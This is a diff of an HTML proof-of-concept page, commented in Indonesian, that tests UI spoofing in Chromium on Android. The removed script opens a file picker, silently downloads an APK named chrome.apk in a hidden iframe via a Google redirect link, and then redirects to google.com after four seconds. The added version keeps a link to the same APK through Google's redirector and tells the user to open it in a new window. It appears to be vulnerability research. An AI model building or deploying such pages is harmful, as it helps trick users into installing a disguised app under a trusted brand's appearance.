@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Enhanced UI Spoofing & 4s Redirect</title>
+    <title>PoC Google Redirect & APK</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -17,14 +17,14 @@
         .container {
             margin-top: 30px;
         }
-        button, a.button-link {
+        a.button-link {
             display: inline-block;
             margin: 15px;
             padding: 14px 28px;
             font-size: 16px;
             font-weight: bold;
             cursor: pointer;
-            background-color: #d93025; /* Warna aksen Google/Chrome */
+            background-color: #1a73e8;
             color: white;
             border: none;
             border-radius: 6px;
@@ -32,84 +32,26 @@
             box-shadow: 0 4px 6px rgba(0,0,0,0.1);
             transition: background 0.2s;
         }
-        button:hover, a.button-link:hover {
-            background-color: #b5221b;
-        }
-        .secondary {
-            background-color: #1a73e8;
-        }
-        .secondary:hover {
+        a.button-link:hover {
             background-color: #1557b0;
         }
     </style>
 </head>
 <body>
 
-    <h1>Chromium Android UI Spoofing PoC</h1>
-    <p>Pilih salah satu simulasi di bawah untuk menguji perilaku multi-window & dialog:</p>
+    <h1>PoC Test Page</h1>
+    <p>Silakan long-press tautan di bawah dan pilih "Open in new window":</p>
 
     <div class="container">
-        <!-- Tombol Asli: File Picker -->
         <div>
-            <button id="openPickerBtn" class="secondary">Open New Window & Upload Photo</button>
-        </div>
-
-        <!-- Tombol Diperkuat: Jendela atas akan membuka google.com, bawah memproses download APK -->
-        <div>
-            <a href="https://www.google.com" 
+            <a href="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3" 
                class="button-link" 
-               id="downloadApkBtn" 
                target="_blank" 
                rel="noopener noreferrer">
-                Open New Window & Download APK (Google.com Context)
+                Open New Window (Google Redirect)
             </a>
         </div>
     </div>
-
-    <script>
-        // Fungsi pembantu untuk memicu redirect halaman setelah 4 detik
-        function triggerDelayedRedirect() {
-            setTimeout(function() {
-                window.location.href = "https://www.google.com";
-            }, 4000); // 4000 milidetik = 4 detik
-        }
-
-        // Logika asli Anda untuk File Picker
-        document.getElementById('openPickerBtn').addEventListener('click', async () => {
-            try {
-                if (window.showOpenFilePicker) {
-                    const handles = await window.showOpenFilePicker();
-                    console.log(handles);
-                }
-            } catch (err) {
-                console.error('File picker ditolak atau dibatalkan:', err);
-            }
-            
-            triggerDelayedRedirect();
-        });
-
-        // Logika untuk tombol Download APK & pemicu jendela bersamaan
-        document.getElementById('downloadApkBtn').addEventListener('click', function(e) {
-            try {
-                if (window.showOpenFilePicker) {
-                    window.showOpenFilePicker().catch(() => {});
-                }
-            } catch (err) {
-                console.error('Trigger error:', err);
-            }
-
-            // Memunculkan iframe download APK di latar belakang halaman bawah
-            setTimeout(function() {
-                const iframe = document.createElement('iframe');
-                iframe.style.display = 'none';
-                iframe.src = "https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3";
-                document.body.appendChild(iframe);
-            }, 500);
-
-            // Memicu hitungan mundur redirect halaman utama ke Google setelah 4 detik
-            triggerDelayedRedirect();
-        });
-    </script>
 
 </body>
 </html>
